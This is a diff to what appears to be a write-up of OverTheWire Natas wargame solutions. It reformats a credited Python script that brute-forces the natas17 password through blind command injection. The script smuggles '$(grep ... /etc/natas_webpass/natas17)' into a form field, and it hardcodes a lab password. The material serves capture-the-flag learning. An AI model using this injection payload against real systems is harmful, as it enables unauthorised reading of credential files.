@@ -418,51 +418,58 @@ This will build the password one character at a time until complete.
 
 6. Sample script (Credits: John Hammond): https://github.com/JohnHammond/overthewire_natas_solutions/blob/master/natas16.py
 
-		#!/usr/bin/env python3
-		# -*- coding: utf-8 -*-
+```
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
 
-		import requests
-		import time
-		from string import ascii_lowercase, ascii_uppercase, digits
+import requests
+import time
+from string import ascii_lowercase, ascii_uppercase, digits
 
-		characters = ascii_lowercase + ascii_uppercase + digits
+characters = ascii_lowercase + ascii_uppercase + digits
 
-		username = 'natas16'
-		password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
+username = 'natas16'
+password = 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo'
 
-		url = f'http://{username}.natas.labs.overthewire.org/'
+url = f'http://{username}.natas.labs.overthewire.org/'
 
-		session = requests.Session()
+session = requests.Session()
 
-		seen_password = []
+seen_password = []
 
-		while len(seen_password) < 32:
-    			found = False
-    			for character in characters:
-        			attempt = ''.join(seen_password) + character
-   				payload = f'anythings$(grep ^{attempt} /etc/natas_webpass/natas17)'
-   				try:
-            				response = session.post(url, data={'needle': payload}, auth=(username, password), timeout=10)
-            				content = response.text
-        			except requests.exceptions.RequestException as e:
-            				print(f"Request failed: {e}")
-            				time.sleep(1)
-            				continue
+while len(seen_password) < 32:
+    found = False
+    for character in characters:
+        attempt = ''.join(seen_password) + character
+        payload = f'anythings$(grep ^{attempt} /etc/natas_webpass/natas17)'
+        try:
+            response = session.post(
+                url,
+                data={'needle': payload},
+                auth=(username, password),
+                timeout=10
+            )
+            content = response.text
+        except requests.exceptions.RequestException as e:
+            print(f"Request failed: {e}")
+            time.sleep(1)
+            continue
 
-        			if 'anythings' not in content:
-            				# grep matched → no change → correct char
-            				seen_password.append(character)
-            				print(f"[+] Found so far: {''.join(seen_password)}")
-            				found = True
-            				break
+        if 'anythings' not in content:
+            # grep matched → no change → correct char
+            seen_password.append(character)
+            print(f"[+] Found so far: {''.join(seen_password)}")
+            found = True
+            break
 
-        			time.sleep(0.1)
+        time.sleep(0.1)
 
-    			if not found:
-        			print("[-] No matching character found. This shouldn't happen!")
-        			break
+    if not found:
+        print("[-] No matching character found. This shouldn't happen!")
+        break
 
-		print(f"[✓] Final password: {''.join(seen_password)}")
+print(f"[✓] Final password: {''.join(seen_password)}")
+```
 
 This will gradually build the password for the next level.
 
@@ -532,6 +539,7 @@ while len(seen_password) < 32:
 print("Recovered password:", ''.join(seen_password))
 ```
 This will gradually build the password.
+
 
 
 
